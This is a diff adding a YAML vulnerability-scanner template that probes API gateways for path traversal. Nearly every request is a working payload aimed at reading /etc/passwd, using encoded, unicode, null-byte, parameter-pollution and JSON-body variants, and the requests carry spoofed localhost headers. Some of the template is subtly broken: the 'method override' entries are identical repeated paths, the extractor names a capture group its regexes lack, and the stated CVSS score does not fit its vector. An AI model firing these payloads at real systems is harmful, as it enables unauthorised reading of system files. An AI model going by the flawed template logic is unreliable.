@@ -1,0 +1,157 @@
+id: api-gateway-routing-bypass
+
+info:
+  name: API Gateway Routing Bypass - Advanced Path Manipulation
+  author: elite-red-team
+  severity: high
+  description: |
+    Detects API gateway routing bypass vulnerabilities using advanced path manipulation techniques.
+    Tests multiple bypass methods including path normalization, URL encoding, and HTTP smuggling.
+  reference:
+    - https://portswigger.net/web-security/api-testing
+    - https://owasp.org/www-project-api-security/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 15
+  tags: api,gateway,bypass,path-traversal,routing
+
+http:
+  - method: GET
+    path:
+      # Path normalization bypasses
+      - "{{BaseURL}}/api/v1/admin/../../../etc/passwd"
+      - "{{BaseURL}}/api/v1/admin/..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/api/v1/admin/..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/api/v1/admin/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      
+      # Unicode normalization bypasses
+      - "{{BaseURL}}/api/v1/admin/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
+      - "{{BaseURL}}/api/v1/admin/..%u002f..%u002f..%u002fetc%u002fpasswd"
+      
+      # HTTP parameter pollution
+      - "{{BaseURL}}/api/v1/admin?path=../../../etc/passwd&path=normal"
+      - "{{BaseURL}}/api/v1/admin?file=../../../etc/passwd"
+      
+      # Case sensitivity bypasses
+      - "{{BaseURL}}/API/V1/ADMIN/../../../etc/passwd"
+      - "{{BaseURL}}/Api/V1/Admin/../../../etc/passwd"
+      
+      # Null byte injection
+      - "{{BaseURL}}/api/v1/admin/../../../etc/passwd%00.jpg"
+      - "{{BaseURL}}/api/v1/admin/../../../etc/passwd%00"
+      
+      # HTTP method override
+      - "{{BaseURL}}/api/v1/admin/../../../etc/passwd"
+      - "{{BaseURL}}/api/v1/admin/../../../etc/passwd"
+      - "{{BaseURL}}/api/v1/admin/../../../etc/passwd"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (compatible; API-Gateway-Bypass-Scanner)"
+      X-Forwarded-For: "127.0.0.1"
+      X-Real-IP: "127.0.0.1"
+      X-Originating-IP: "127.0.0.1"
+      X-Remote-IP: "127.0.0.1"
+      X-Client-IP: "127.0.0.1"
+      X-HTTP-Method-Override: "GET"
+      X-Method-Override: "GET"
+      X-Forwarded-Proto: "https"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 403
+          - 500
+
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+          - "bin:"
+          - "sys:"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "nobody:"
+        condition: or
+
+      - type: word
+        negative: true
+        words:
+          - "404"
+          - "Not Found"
+          - "Page not found"
+          - "File not found"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: sensitive_data
+        regex:
+          - "root:.*?:"
+          - "daemon:.*?:"
+          - "bin:.*?:"
+        group: 1
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/admin"
+      - "{{BaseURL}}/api/v1/user"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "GET"
+      X-Method-Override: "GET"
+
+    body: |
+      {
+        "path": "../../../etc/passwd",
+        "file": "../../../etc/passwd",
+        "filename": "../../../etc/passwd",
+        "directory": "../../../etc/",
+        "resource": "../../../etc/passwd"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+          - "/bin/bash"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/v1/files"
+
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "GET"
+
+    body: |
+      {
+        "action": "read",
+        "path": "../../../etc/passwd"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:"
+          - "daemon:"
+        condition: or
